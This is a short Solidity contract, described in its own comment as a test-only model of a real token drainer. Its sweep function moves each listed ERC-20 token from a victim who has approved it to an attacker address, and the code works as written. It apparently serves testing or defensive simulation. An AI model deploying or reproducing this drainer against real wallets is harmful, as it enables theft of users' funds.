// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Test-only model of a real drainer: it pulls every listed token from a victim
///      that has approved it, in one call, and forwards everything to the attacker.
contract SweeperBot {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function sweep(address victim, address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 t = IERC20(tokens[i]);
            uint256 bal = t.balanceOf(victim);
            uint256 allowed = t.allowance(victim, address(this));
            uint256 amount = bal < allowed ? bal : allowed;
            if (amount > 0) t.transferFrom(victim, attacker, amount);
        }
    }
}
